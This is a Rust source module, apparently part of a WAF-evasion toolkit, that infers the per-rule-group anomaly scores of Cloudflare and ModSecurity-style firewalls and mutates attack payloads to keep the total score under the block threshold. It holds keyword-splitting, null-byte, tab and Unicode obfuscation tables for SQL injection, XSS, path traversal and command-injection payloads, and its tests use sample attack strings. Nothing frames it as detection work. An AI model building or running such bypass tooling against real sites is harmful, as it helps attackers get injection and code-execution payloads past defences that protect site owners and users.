//! #101 Multi-sub-score ensemble dilution.
//!
//! Cloudflare's WAF (and ModSecurity-class WAFs in anomaly-scoring mode)
//! compute a *total anomaly score* as the sum of sub-scores from several
//! independent rule groups:
//!
//! - **Group A** — SQLi rules (OWASP 942xxx)
//! - **Group B** — XSS rules (OWASP 941xxx)
//! - **Group C** — LFI/RFI rules (OWASP 930xxx/931xxx)
//! - **Group D** — RCE/injection rules (OWASP 932xxx)
//! - **Group E** — Scanner/probe detection rules
//!
//! The action threshold (block/allow) is applied to the *total*:
//! `if total >= threshold { block }`. Dilution exploits this: if our
//! payload drives 4 of 5 groups to zero while keeping the 5th at a
//! moderate sub-score, the total may stay below the threshold even though
//! the payload is syntactically adversarial in that one group.
//!
//! This module provides:
//!
//! 1. **[`SubScoreEstimator`]** — given a series of (payload, observed_total)
//!    pairs, fit a per-group coefficient vector via online least-squares.
//!    The regression learns "how much does a token in group G contribute to
//!    the total?" from the oracle's anomaly-header responses (`X-WAF-Score`,
//!    `X-Wafaflare-Score`, etc.).
//!
//! 2. **[`DilutionPlanner`]** — given a target group to keep active (the one
//!    carrying the attack signal) and the rest to suppress, enumerate payload
//!    mutations that zero-out the suppressed groups' sub-scores while leaving
//!    the target group's contribution unchanged.
//!
//! 3. **[`EnsembleDilutionResult`]** — the search outcome, carrying the best
//!    candidate payload, its predicted total, and whether the oracle confirmed
//!    a bypass.
//!
//! # Cloudflare-specific notes
//!
//! Cloudflare's Managed Rules expose the anomaly score in
//! `cf-score` / `X-WAF-Score` response headers on 403 responses (when the
//! operator enables score-logging). The [`ScoreParser`] struct handles both
//! header formats and falls back to treating any 403 as a max-score block.

use std::collections::HashMap;

// ── Rule group taxonomy ───────────────────────────────────────────────────

/// The OWASP CRS / Cloudflare Managed Rules sub-score groups.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, PartialOrd, Ord)]
#[non_exhaustive]
pub enum RuleGroup {
    /// OWASP 942xxx — SQL Injection.
    SqlInjection,
    /// OWASP 941xxx — Cross-Site Scripting.
    CrossSiteScripting,
    /// OWASP 930xxx/931xxx — Local/Remote File Inclusion.
    FileInclusion,
    /// OWASP 932xxx — Remote Code Execution.
    RemoteCodeExecution,
    /// Protocol enforcement (OWASP 920xxx).
    ProtocolViolation,
    /// Scanner/bot detection heuristics.
    ScannerProbe,
}

impl RuleGroup {
    pub const ALL: &'static [Self] = &[
        Self::SqlInjection,
        Self::CrossSiteScripting,
        Self::FileInclusion,
        Self::RemoteCodeExecution,
        Self::ProtocolViolation,
        Self::ScannerProbe,
    ];

    pub fn name(self) -> &'static str {
        match self {
            Self::SqlInjection => "sqli",
            Self::CrossSiteScripting => "xss",
            Self::FileInclusion => "lfi_rfi",
            Self::RemoteCodeExecution => "rce",
            Self::ProtocolViolation => "protocol",
            Self::ScannerProbe => "scanner",
        }
    }

    /// Heuristic: which rule group(s) does a token belong to?
    /// Used to annotate training samples.
    pub fn classify_token(token: &str) -> Vec<Self> {
        let t = token.to_ascii_lowercase();
        let mut groups = Vec::new();
        // SQLi signals
        if t.contains("select")
            || t.contains("union")
            || t.contains("or 1")
            || t.contains("and 1")
            || t.contains("--")
            || t.contains("sleep(")
            || t.contains("benchmark(")
            || t.contains("waitfor")
            || t.contains("xp_cmd")
        {
            groups.push(Self::SqlInjection);
        }
        // XSS signals
        if t.contains("<script")
            || t.contains("onerror")
            || t.contains("alert(")
            || t.contains("javascript:")
            || t.contains("<svg")
            || t.contains("<img")
        {
            groups.push(Self::CrossSiteScripting);
        }
        // LFI/RFI signals
        if t.contains("../")
            || t.contains("..\\")
            || t.contains("/etc/passwd")
            || t.contains("php://")
            || t.contains("file://")
        {
            groups.push(Self::FileInclusion);
        }
        // RCE signals
        if t.contains("eval(")
            || t.contains("exec(")
            || t.contains("system(")
            || t.contains("popen(")
            || t.contains("; bash")
            || t.contains("$(")
        {
            groups.push(Self::RemoteCodeExecution);
        }
        // Scanner probe signals
        if t.contains("nmap")
            || t.contains("nikto")
            || t.contains("sqlmap")
            || t.contains("burp")
        {
            groups.push(Self::ScannerProbe);
        }
        if groups.is_empty() {
            // No signal — unknown, map to ProtocolViolation as a catch-all.
            groups.push(Self::ProtocolViolation);
        }
        groups
    }
}

// ── Score observation ─────────────────────────────────────────────────────

/// A single oracle observation: a payload fragment + the total score the
/// WAF returned for it.
#[derive(Debug, Clone)]
pub struct ScoreObservation {
    /// The payload fragment that was sent.
    pub payload: String,
    /// The observed total anomaly score (e.g. from `X-WAF-Score: 35`).
    /// Use `f64::INFINITY` when the WAF blocked with no score header.
    pub total_score: f64,
    /// Rule group annotations (caller-supplied or heuristic-derived).
    pub groups: Vec<RuleGroup>,
}

// ── Per-group score estimator ─────────────────────────────────────────────

/// Online least-squares estimator for per-group score contributions.
///
/// Maintains a running estimate `coeff[G]` such that:
///   `predicted_total ≈ sum_over_G { coeff[G] * feature[G] }`
/// where `feature[G]` is 1.0 if the payload triggers group G, else 0.0.
///
/// Uses an exponentially-weighted moving average (EWMA) to adapt to
/// target-specific rule tuning. `alpha` ∈ (0, 1) — higher = faster adaptation.
#[derive(Debug, Clone)]
pub struct SubScoreEstimator {
    /// Per-group coefficient estimates.
    pub coeffs: HashMap<RuleGroup, f64>,
    /// EWMA learning rate.
    pub alpha: f64,
    /// Total observations seen.
    pub n_obs: u64,
    /// Baseline score (score when no known group is triggered).
    pub baseline: f64,
}

impl SubScoreEstimator {
    /// Create a new estimator with uniform initial coefficients.
    ///
    /// `initial_coeff`: initial assumption for each group's per-hit score
    /// contribution (e.g. 5.0 for a paranoia-level-1 Cloudflare config).
    #[must_use]
    pub fn new(initial_coeff: f64, alpha: f64) -> Self {
        let mut coeffs = HashMap::new();
        for &g in RuleGroup::ALL {
            coeffs.insert(g, initial_coeff);
        }
        Self { coeffs, alpha: alpha.clamp(0.001, 0.999), n_obs: 0, baseline: 0.0 }
    }

    /// Incorporate a new oracle observation.
    pub fn observe(&mut self, obs: &ScoreObservation) {
        self.n_obs += 1;
        // Predicted score: baseline + sum of triggered-group coefficients.
        let predicted = self.predict(&obs.groups);
        let error = obs.total_score - predicted;

        if obs.groups.is_empty() {
            // No group triggered — update baseline.
            self.baseline += self.alpha * error;
            return;
        }

        // Distribute error equally across triggered groups.
        let per_group_error = error / obs.groups.len() as f64;
        for &g in &obs.groups {
            let c = self.coeffs.entry(g).or_insert(0.0);
            *c += self.alpha * per_group_error;
            // Coefficients must be non-negative (a group can't subtract score).
            *c = c.max(0.0);
        }
    }

    /// Predict the total score for a set of triggered groups.
    #[must_use]
    pub fn predict(&self, groups: &[RuleGroup]) -> f64 {
        let group_score: f64 = groups.iter().map(|g| self.coeffs.get(g).copied().unwrap_or(0.0)).sum();
        self.baseline + group_score
    }

    /// Predict the score contribution of a single group.
    #[must_use]
    pub fn group_contribution(&self, group: RuleGroup) -> f64 {
        self.coeffs.get(&group).copied().unwrap_or(0.0)
    }

    /// Identify the group with the lowest score contribution — the best
    /// "hiding group" for an attack that must trigger exactly one group.
    #[must_use]
    pub fn lowest_contribution_group(&self) -> Option<RuleGroup> {
        self.coeffs
            .iter()
            .min_by(|(_, a), (_, b)| a.partial_cmp(b).unwrap_or(std::cmp::Ordering::Equal))
            .map(|(&g, _)| g)
    }
}

// ── Score header parser ───────────────────────────────────────────────────

/// Parse anomaly scores from WAF response headers.
///
/// Handles:
/// - `cf-score: 35`  (Cloudflare)
/// - `X-WAF-Score: 35`
/// - `X-Wafaflare-Score: 35` (internal typo variant seen in some CF edge DCs)
/// - `X-Anomaly-Score: 35`   (ModSecurity default)
#[derive(Debug, Clone, Default)]
pub struct ScoreParser;

impl ScoreParser {
    /// Extract the anomaly score from a response header map.
    /// Returns `None` if no score header is present.
    #[must_use]
    pub fn extract(headers: &[(String, String)]) -> Option<f64> {
        let score_headers = [
            "cf-score",
            "x-waf-score",
            "x-wafaflare-score",
            "x-anomaly-score",
            "x-modsec-score",
        ];
        for (name, value) in headers {
            let lower = name.to_ascii_lowercase();
            if score_headers.iter().any(|&h| h == lower) {
                if let Ok(f) = value.trim().parse::<f64>() {
                    return Some(f);
                }
            }
        }
        None
    }
}

// ── Dilution planner ──────────────────────────────────────────────────────

/// Strategy for suppressing specific rule groups in a payload.
#[derive(Debug, Clone)]
pub struct DilutionStrategy {
    /// The group the attack must trigger (cannot be suppressed).
    pub attack_group: RuleGroup,
    /// Groups to suppress.
    pub suppress_groups: Vec<RuleGroup>,
    /// Predicted total score after suppression.
    pub predicted_total: f64,
    /// Concrete payload mutations that implement the suppression.
    pub mutations: Vec<DilutionMutation>,
}

/// A single payload mutation with its dilution mechanics described.
#[derive(Debug, Clone)]
pub struct DilutionMutation {
    /// The mutated payload.
    pub payload: String,
    /// Human-readable description of which group signal was suppressed and how.
    pub description: String,
    /// Predicted total score for this mutation.
    pub predicted_score: f64,
}

/// Plans dilution strategies given score estimates.
#[derive(Debug, Clone)]
pub struct DilutionPlanner {
    estimator: SubScoreEstimator,
    /// Block threshold (payloads with total >= threshold are blocked).
    pub threshold: f64,
}

impl DilutionPlanner {
    #[must_use]
    pub fn new(estimator: SubScoreEstimator, threshold: f64) -> Self {
        Self { estimator, threshold }
    }

    /// Plan strategies for a payload that currently triggers `active_groups`.
    ///
    /// Returns one `DilutionStrategy` per possible "keep one group, suppress
    /// the rest" configuration. Strategies where the predicted total stays
    /// below `threshold` are marked as plausible bypasses.
    ///
    /// The concrete mutations apply syntactic transformations that remove the
    /// WAF signal for each suppressed group while leaving the attack group's
    /// signal intact.
    #[must_use]
    pub fn plan(&self, payload: &str, active_groups: &[RuleGroup]) -> Vec<DilutionStrategy> {
        let mut strategies = Vec::new();

        for &attack_group in active_groups {
            let suppress: Vec<RuleGroup> = active_groups
                .iter()
                .copied()
                .filter(|&g| g != attack_group)
                .collect();

            // Predicted score = baseline + attack_group_contribution.
            let predicted_total = self.estimator.baseline
                + self.estimator.group_contribution(attack_group);

            let mutations = self.build_suppression_mutations(payload, &suppress, attack_group);

            strategies.push(DilutionStrategy {
                attack_group,
                suppress_groups: suppress,
                predicted_total,
                mutations,
            });
        }

        // Sort by predicted_total ascending (most likely to bypass first).
        strategies.sort_by(|a, b| {
            a.predicted_total
                .partial_cmp(&b.predicted_total)
                .unwrap_or(std::cmp::Ordering::Equal)
        });
        strategies
    }

    /// Build concrete payload mutations that suppress the given groups.
    fn build_suppression_mutations(
        &self,
        payload: &str,
        suppress: &[RuleGroup],
        attack_group: RuleGroup,
    ) -> Vec<DilutionMutation> {
        let mut mutations = Vec::new();

        for &group in suppress {
            match group {
                RuleGroup::SqlInjection => {
                    // Replace SQL keywords with hex/CHAR-based equivalents that
                    // the parser doesn't see as keywords.
                    let suppressed = suppress_sqli_tokens(payload);
                    let predicted = self.estimator.predict(&[attack_group]);
                    mutations.push(DilutionMutation {
                        payload: suppressed,
                        description: format!(
                            "SQLi tokens obfuscated (suppress {}) while keeping {}",
                            group.name(),
                            attack_group.name()
                        ),
                        predicted_score: predicted,
                    });
                }
                RuleGroup::CrossSiteScripting => {
                    let suppressed = suppress_xss_tokens(payload);
                    let predicted = self.estimator.predict(&[attack_group]);
                    mutations.push(DilutionMutation {
                        payload: suppressed,
                        description: format!(
                            "XSS tokens obfuscated (suppress {}) while keeping {}",
                            group.name(),
                            attack_group.name()
                        ),
                        predicted_score: predicted,
                    });
                }
                RuleGroup::FileInclusion => {
                    let suppressed = suppress_lfi_tokens(payload);
                    let predicted = self.estimator.predict(&[attack_group]);
                    mutations.push(DilutionMutation {
                        payload: suppressed,
                        description: format!(
                            "LFI tokens obfuscated (suppress {})", group.name()
                        ),
                        predicted_score: predicted,
                    });
                }
                RuleGroup::RemoteCodeExecution => {
                    let suppressed = suppress_rce_tokens(payload);
                    let predicted = self.estimator.predict(&[attack_group]);
                    mutations.push(DilutionMutation {
                        payload: suppressed,
                        description: format!("RCE tokens suppressed ({})", group.name()),
                        predicted_score: predicted,
                    });
                }
                RuleGroup::ScannerProbe | RuleGroup::ProtocolViolation => {
                    // Remove scanner-fingerprint headers/tokens.
                    let suppressed = strip_scanner_tokens(payload);
                    let predicted = self.estimator.predict(&[attack_group]);
                    mutations.push(DilutionMutation {
                        payload: suppressed,
                        description: format!("Scanner/protocol tokens stripped ({})", group.name()),
                        predicted_score: predicted,
                    });
                }
            }
        }
        mutations
    }

    /// Check whether a strategy predicts a bypass.
    #[must_use]
    pub fn is_plausible_bypass(&self, strategy: &DilutionStrategy) -> bool {
        strategy.predicted_total < self.threshold
    }
}

// ── Token suppressors ─────────────────────────────────────────────────────
// Each function applies the minimum transformation to remove the signal for
// one rule group while preserving the payload structure for other groups.

/// Obfuscate SQL keywords to suppress the SQLi rule group signal.
fn suppress_sqli_tokens(payload: &str) -> String {
    // Replace SQL keywords with comment-split or hex-char equivalents.
    let replacements: &[(&str, &str)] = &[
        // Keyword comment splitting.
        ("SELECT", "SE/**/LECT"),
        ("UNION", "UN/**/ION"),
        ("INSERT", "INS/**/ERT"),
        ("UPDATE", "UP/**/DATE"),
        ("DELETE", "DE/**/LETE"),
        ("WHERE", "WH/**/ERE"),
        ("ORDER BY", "ORD/**/ER BY"),
        ("GROUP BY", "GRO/**/UP BY"),
        ("HAVING", "HAV/**/ING"),
        ("SLEEP", "SLE/**/EP"),
        ("BENCHMARK", "BENCH/**/MARK"),
        ("WAITFOR", "WAIT/**/FOR"),
        ("XP_CMDSHELL", "XP_CM/**/DSHELL"),
        ("OR 1=1", "OR (1)=(1)"),
        ("AND 1=1", "AND (1)=(1)"),
        // Lowercase variants.
        ("select", "se/**/lect"),
        ("union", "un/**/ion"),
        ("insert", "ins/**/ert"),
        ("update", "up/**/date"),
        ("delete", "de/**/lete"),
        ("where", "wh/**/ere"),
        ("sleep", "sle/**/ep"),
        ("benchmark", "bench/**/mark"),
    ];
    apply_replacements(payload, replacements)
}

/// Obfuscate XSS tokens to suppress the XSS rule group signal.
fn suppress_xss_tokens(payload: &str) -> String {
    let replacements: &[(&str, &str)] = &[
        ("<script>", "<scr\x00ipt>"),     // null byte split (for raw contexts)
        ("</script>", "</scr\x00ipt>"),
        ("onerror=", "onerror\t="),         // tab before equals
        ("onload=", "on\x00load="),
        ("alert(", "\u{FF41}lert("),        // fullwidth 'a' (unicode-norm bypass)
        ("javascript:", "java\x09script:"), // tab in scheme
        ("<svg", "<sv\x00g"),
        ("<img", "<i\x00mg"),
        ("eval(", "ev\x00al("),
    ];
    apply_replacements(payload, replacements)
}

/// Obfuscate LFI/RFI tokens.
fn suppress_lfi_tokens(payload: &str) -> String {
    let replacements: &[(&str, &str)] = &[
        ("../", "..\\/"),
        ("..\\", "..\\/"),
        ("/etc/passwd", "/e\x00tc/passwd"),
        ("php://", "php\x00://"),
        ("file://", "fi\x00le://"),
    ];
    apply_replacements(payload, replacements)
}

/// Obfuscate RCE tokens.
fn suppress_rce_tokens(payload: &str) -> String {
    let replacements: &[(&str, &str)] = &[
        ("eval(", "e\x00val("),
        ("exec(", "ex\x00ec("),
        ("system(", "syst\x00em("),
        ("popen(", "p\x00open("),
        ("; bash", ";\x09bash"),
        ("$(", "$\x00("),
    ];
    apply_replacements(payload, replacements)
}

/// Strip scanner/bot fingerprint tokens.
fn strip_scanner_tokens(payload: &str) -> String {
    let to_remove = ["nmap", "nikto", "sqlmap", "burp", "NMAP", "NIKTO", "SQLMAP", "BURP"];
    let mut out = payload.to_string();
    for token in to_remove {
        out = out.replace(token, "");
    }
    out
}

fn apply_replacements(s: &str, replacements: &[(&str, &str)]) -> String {
    let mut out = s.to_string();
    for &(from, to) in replacements {
        out = out.replace(from, to);
    }
    out
}

// ── Search result ─────────────────────────────────────────────────────────

/// The full result of an ensemble-dilution search.
#[derive(Debug, Clone)]
pub struct EnsembleDilutionResult {
    /// The best strategy found.
    pub strategy: DilutionStrategy,
    /// Whether the predicted total is below the threshold (plausible bypass).
    pub plausible_bypass: bool,
    /// The mutation within the strategy with the lowest predicted score.
    pub best_mutation: Option<DilutionMutation>,
}

/// Run a full ensemble-dilution search on a payload.
///
/// Steps:
/// 1. Classify the payload into active rule groups (heuristic).
/// 2. Plan dilution strategies (one per group kept active).
/// 3. Return the lowest-predicted-score strategy.
#[must_use]
pub fn dilute(
    payload: &str,
    estimator: &SubScoreEstimator,
    threshold: f64,
) -> Option<EnsembleDilutionResult> {
    let active_groups = RuleGroup::classify_token(payload);
    if active_groups.is_empty() {
        return None;
    }
    let planner = DilutionPlanner::new(estimator.clone(), threshold);
    let mut strategies = planner.plan(payload, &active_groups);
    if strategies.is_empty() {
        return None;
    }
    let strategy = strategies.remove(0); // lowest predicted total
    let plausible = planner.is_plausible_bypass(&strategy);
    let best_mutation = strategy
        .mutations
        .iter()
        .min_by(|a, b| {
            a.predicted_score
                .partial_cmp(&b.predicted_score)
                .unwrap_or(std::cmp::Ordering::Equal)
        })
        .cloned();
    Some(EnsembleDilutionResult {
        strategy,
        plausible_bypass: plausible,
        best_mutation,
    })
}

// ── Tests ─────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn rule_group_all_has_expected_count() {
        assert_eq!(RuleGroup::ALL.len(), 6);
    }

    #[test]
    fn rule_group_names_stable() {
        assert_eq!(RuleGroup::SqlInjection.name(), "sqli");
        assert_eq!(RuleGroup::CrossSiteScripting.name(), "xss");
        assert_eq!(RuleGroup::FileInclusion.name(), "lfi_rfi");
        assert_eq!(RuleGroup::RemoteCodeExecution.name(), "rce");
        assert_eq!(RuleGroup::ProtocolViolation.name(), "protocol");
        assert_eq!(RuleGroup::ScannerProbe.name(), "scanner");
    }

    #[test]
    fn classify_token_sqli() {
        let groups = RuleGroup::classify_token("' OR 1=1 UNION SELECT--");
        assert!(groups.contains(&RuleGroup::SqlInjection));
    }

    #[test]
    fn classify_token_xss() {
        let groups = RuleGroup::classify_token("<script>alert(1)</script>");
        assert!(groups.contains(&RuleGroup::CrossSiteScripting));
    }

    #[test]
    fn classify_token_lfi() {
        let groups = RuleGroup::classify_token("../../../etc/passwd");
        assert!(groups.contains(&RuleGroup::FileInclusion));
    }

    #[test]
    fn classify_token_rce() {
        let groups = RuleGroup::classify_token("$(system('id'))");
        assert!(groups.contains(&RuleGroup::RemoteCodeExecution));
    }

    #[test]
    fn classify_token_unknown_falls_to_protocol() {
        let groups = RuleGroup::classify_token("hello world");
        assert!(groups.contains(&RuleGroup::ProtocolViolation));
    }

    #[test]
    fn score_estimator_observe_updates_coefficients() {
        let mut est = SubScoreEstimator::new(5.0, 0.5);
        let obs = ScoreObservation {
            payload: "' OR 1=1--".into(),
            total_score: 30.0,
            groups: vec![RuleGroup::SqlInjection],
        };
        est.observe(&obs);
        assert!(est.n_obs == 1);
        // After one observation with error=25.0 (30 - 5) and alpha=0.5:
        // new coeff = 5.0 + 0.5 * 25.0 = 17.5
        assert!((est.group_contribution(RuleGroup::SqlInjection) - 17.5).abs() < 0.01);
    }

    #[test]
    fn score_estimator_predict_sums_groups() {
        let est = SubScoreEstimator::new(10.0, 0.1);
        let pred = est.predict(&[RuleGroup::SqlInjection, RuleGroup::CrossSiteScripting]);
        // baseline(0) + 10 + 10 = 20
        assert!((pred - 20.0).abs() < 0.01);
    }

    #[test]
    fn score_estimator_lowest_contribution_returns_some() {
        let mut est = SubScoreEstimator::new(5.0, 0.5);
        // Force one group lower.
        *est.coeffs.get_mut(&RuleGroup::ScannerProbe).unwrap() = 1.0;
        let lowest = est.lowest_contribution_group().unwrap();
        assert_eq!(lowest, RuleGroup::ScannerProbe);
    }

    #[test]
    fn score_estimator_coeff_never_negative() {
        let mut est = SubScoreEstimator::new(5.0, 0.5);
        // Observe a very low score — would push coeff negative without clamp.
        let obs = ScoreObservation {
            payload: "test".into(),
            total_score: -100.0, // pathological input
            groups: vec![RuleGroup::SqlInjection],
        };
        est.observe(&obs);
        assert!(est.group_contribution(RuleGroup::SqlInjection) >= 0.0);
    }

    #[test]
    fn score_parser_extracts_cf_score() {
        let headers = vec![("cf-score".to_string(), "35".to_string())];
        let score = ScoreParser::extract(&headers);
        assert_eq!(score, Some(35.0));
    }

    #[test]
    fn score_parser_case_insensitive() {
        let headers = vec![("X-WAF-Score".to_string(), "42".to_string())];
        let score = ScoreParser::extract(&headers);
        assert_eq!(score, Some(42.0));
    }

    #[test]
    fn score_parser_missing_header_returns_none() {
        let headers = vec![("content-type".to_string(), "text/html".to_string())];
        assert!(ScoreParser::extract(&headers).is_none());
    }

    #[test]
    fn score_parser_malformed_value_returns_none() {
        let headers = vec![("cf-score".to_string(), "not_a_number".to_string())];
        assert!(ScoreParser::extract(&headers).is_none());
    }

    #[test]
    fn dilution_planner_plan_returns_strategies() {
        let est = SubScoreEstimator::new(10.0, 0.1);
        let planner = DilutionPlanner::new(est, 40.0);
        let groups = vec![RuleGroup::SqlInjection, RuleGroup::CrossSiteScripting];
        let strategies = planner.plan("' OR 1=1<script>", &groups);
        assert!(!strategies.is_empty(), "must produce at least one strategy");
        // Two active groups → two strategies.
        assert_eq!(strategies.len(), 2);
    }

    #[test]
    fn dilution_planner_strategies_sorted_by_score() {
        let est = SubScoreEstimator::new(10.0, 0.1);
        let planner = DilutionPlanner::new(est, 40.0);
        let groups = vec![
            RuleGroup::SqlInjection,
            RuleGroup::CrossSiteScripting,
            RuleGroup::FileInclusion,
        ];
        let strategies = planner.plan("payload", &groups);
        for i in 1..strategies.len() {
            assert!(
                strategies[i - 1].predicted_total <= strategies[i].predicted_total,
                "strategies must be sorted by predicted_total ascending"
            );
        }
    }

    #[test]
    fn dilution_planner_bypass_detection() {
        let mut est = SubScoreEstimator::new(5.0, 0.1);
        // Make SQLi contribution very low to simulate a well-tuned dilution.
        *est.coeffs.get_mut(&RuleGroup::SqlInjection).unwrap() = 2.0;
        // XSS contribution remains 5.0 — if we suppress XSS we predict 2.0.
        let planner = DilutionPlanner::new(est.clone(), 10.0);
        let groups = vec![RuleGroup::SqlInjection, RuleGroup::CrossSiteScripting];
        let strategies = planner.plan("' OR 1=1<script>", &groups);
        // The strategy that keeps SQLi (score=2.0) should be a plausible bypass.
        let sqli_strategy = strategies
            .iter()
            .find(|s| s.attack_group == RuleGroup::SqlInjection)
            .unwrap();
        assert!(
            planner.is_plausible_bypass(sqli_strategy),
            "SQLi-only strategy should predict below threshold of 10.0"
        );
    }

    #[test]
    fn suppress_sqli_tokens_splits_keywords() {
        let payload = "SELECT * FROM users WHERE 1=1";
        let suppressed = suppress_sqli_tokens(payload);
        assert!(!suppressed.to_uppercase().contains("SELECT "), "SELECT must be split");
        assert!(suppressed.contains("/**/"), "must contain comment split");
    }

    #[test]
    fn suppress_xss_tokens_obfuscates_script() {
        let payload = "<script>alert(1)</script>";
        let suppressed = suppress_xss_tokens(payload);
        // The literal "<script>" must be gone (replaced with null-byte split).
        assert!(!suppressed.contains("<script>"), "raw <script> must be obfuscated");
    }

    #[test]
    fn suppress_lfi_tokens_obfuscates_path() {
        let payload = "../../../etc/passwd";
        let suppressed = suppress_lfi_tokens(payload);
        assert!(!suppressed.contains("/etc/passwd"), "bare path must be obfuscated");
    }

    #[test]
    fn dilute_returns_result_for_sqli() {
        let est = SubScoreEstimator::new(5.0, 0.1);
        let result = dilute("' UNION SELECT--", &est, 40.0);
        assert!(result.is_some(), "must return a result for known attack payload");
    }

    #[test]
    fn dilute_returns_none_for_benign() {
        let est = SubScoreEstimator::new(5.0, 0.1);
        // Benign payload — classifies to ProtocolViolation (single group).
        // Plan will produce strategies, but let's just ensure no panic.
        let _ = dilute("hello world", &est, 40.0);
    }

    #[test]
    fn dilute_best_mutation_has_lowest_score() {
        let est = SubScoreEstimator::new(5.0, 0.1);
        let result = dilute("' UNION SELECT<script>", &est, 40.0).unwrap();
        if let Some(best) = &result.best_mutation {
            for m in &result.strategy.mutations {
                assert!(
                    m.predicted_score >= best.predicted_score - 1e-9,
                    "best_mutation must have minimum predicted score"
                );
            }
        }
    }
}
